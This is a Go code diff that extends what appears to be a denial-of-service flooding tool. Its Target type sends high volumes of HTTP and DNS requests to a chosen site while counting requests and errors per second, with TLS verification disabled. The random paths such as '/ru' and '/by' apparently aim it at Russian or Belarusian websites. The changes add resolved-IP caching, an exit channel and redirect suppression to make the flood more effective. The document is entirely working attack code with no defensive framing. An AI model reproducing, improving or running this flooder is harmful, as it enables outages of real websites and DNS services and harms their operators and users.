@@ -8,6 +8,7 @@ import (
 	"net/http"
 	"net/url"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
 
@@ -17,9 +18,11 @@ import (
 // The target type that manages a target. A target can be a website, a dns, or something like that.
 // TODO: refactor this into an interface and make New create different concrete types that deal with a particular kind of target.
 type Target struct {
-	address   string
-	port      int
-	randomize bool
+	sync.RWMutex
+	address         string
+	resolvedAddress []string
+	port            int
+	randomize       bool
 
 	requestsPerSecond float64
 	errorsPerSecond   float64
@@ -27,31 +30,36 @@ type Target struct {
 	errors            int64
 
 	requestCh chan string
-
-	urls []string
+	exitCh    chan struct{}
 
 	httpTransport *http.Transport
 	httpClient    *http.Client
 	dnsClient     *dns.Client
+	lastResolved  time.Time
 }
 
 // Creates a target instance with all the configurations needed for an attack.
-func New(addr, proxy string) Target {
+func New(addr, proxy string) *Target {
 	tr := &http.Transport{
 		MaxIdleConns:       10000,
 		IdleConnTimeout:    30 * time.Second,
 		DisableCompression: true,
 		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
 	}
-	client := &http.Client{Transport: tr}
+	client := &http.Client{
+		Transport: tr,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
 
 	dnsClient := &dns.Client{
 		DialTimeout: time.Millisecond * 700,
 		ReadTimeout: time.Second,
 	}
 
-	ret := Target{
-		address:       strings.Trim(addr, " \r\n\t"),
+	ret := &Target{
+		address:       strings.TrimRight(strings.Trim(addr, " \r\n\t"), "/"),
 		port:          80,
 		randomize:     true,
 		httpTransport: tr,
@@ -100,8 +108,12 @@ func (t *Target) Run(ctx context.Context, N, maxRPS int, progress func(requests,
 		select {
 		case <-ctx.Done():
 			return
+		case <-t.exitCh:
+			return
 		case <-timerGen.C:
-			t.requestCh <- t.generate()
+			if t.isHostResolved() {
+				t.requestCh <- t.generate()
+			}
 		case <-timer.C:
 			requests := float64(atomic.SwapInt64(&t.requests, 0))
 			errors := float64(atomic.SwapInt64(&t.errors, 0))
@@ -114,6 +126,11 @@ func (t *Target) Run(ctx context.Context, N, maxRPS int, progress func(requests,
 
 func (t *Target) flood(ctx context.Context) {
 	for addr := range t.requestCh {
+		addr = t.replaceWithResolvedIP(addr)
+		if addr == "" {
+			continue
+		}
+
 		atomic.AddInt64(&t.requests, 1)
 		if t.perform(ctx, addr) != nil {
 			atomic.AddInt64(&t.errors, 1)
@@ -148,7 +165,7 @@ func (t *Target) generate() string {
 
 	urls := []string{"/info", "/admin", "/ru", "/by", "/en", "/user", "/api", "/auth", "/prod", "/uslugi", "/blog", "/about"}
 	url := urls[rand.Intn(len(urls))]
-	if strings.Contains(t.address, "/") {
+	if strings.HasSuffix(t.address, "/") {
 		url = ""
 	}
 
